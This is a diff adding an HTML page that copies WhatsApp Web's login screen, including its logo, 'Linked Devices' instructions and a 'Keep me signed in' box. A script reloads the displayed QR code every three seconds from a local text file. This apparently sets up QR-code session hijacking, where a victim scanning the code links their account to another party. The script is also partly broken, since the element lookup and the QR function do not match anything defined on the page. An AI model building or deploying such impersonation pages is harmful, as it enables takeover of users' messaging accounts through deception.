@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title>WhatsApp Web</title>
+</head>
+
+<body>
+  <div class="App">
+    <div class="login">
+      <div class="login__header">
+        <img src='./whatsapp.svg' alt="whatsapp logo" class="login__header__logo" />
+        <div class="login__header_title">Whatsapp Web</div>
+      </div>
+
+      <div class="login__content">
+        <div class="login__content__row">
+          <div class="login__content__row__description">
+            <h1 class="content__heading">To use WhatsApp on your computer:</h1>
+            <ol>
+              <li>
+                Open WhatsApp on your phone
+              </li>
+              <li>
+                Tap Menu or <b>Settings</b> and select <b>Linked Devices</b>
+              </li>
+              <li>Point your phone to this screen to capture this code </li>
+            </ol>
+          </div>
+          <div>
+            <div class="qr">
+              <div class="qrcode"></div>
+              <script type="text/javascript">
+
+                function updateQRCode(text) {
+
+                  var element = document.getElementById("qrcode");
+
+                  var bodyElement = document.body;
+                  if (element.lastChild)
+                    element.replaceChild(showQRCode(text), element.lastChild);
+                  else
+                    element.appendChild(showQRCode(text));
+
+                }
+
+                updateQRCode("test")
+
+                const interval = setInterval(function () {
+                  fetch('test.txt', { cache: "no-store" })
+                    .then(response => response.text())
+                    .then(text => updateQRCode(text))
+                }, 3000);
+
+
+              </script>
+            </div>
+            <input type="checkbox" name="signed" id="signed"><label for="signed">Keep me signed in</label>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
